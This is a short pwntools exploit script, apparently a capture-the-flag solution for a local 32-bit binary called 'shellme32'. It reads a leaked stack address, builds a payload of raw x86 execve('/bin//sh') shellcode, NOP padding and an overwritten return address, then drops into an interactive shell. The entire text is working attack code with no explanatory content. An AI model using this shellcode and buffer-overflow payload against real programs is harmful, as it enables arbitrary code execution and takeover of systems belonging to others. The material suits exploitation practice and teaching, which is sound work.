from pwn import *

buffer_length = 40
shellcode = "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"

app = process('./shellme32')
app.recvline()

buffer_address = int(app.recvline()[2:-1],16)
payload = shellcode + '\x90' * (buffer_length - len(shellcode)) + p32(buffer_address)

app.sendlineafter("> ", payload)
app.interactive()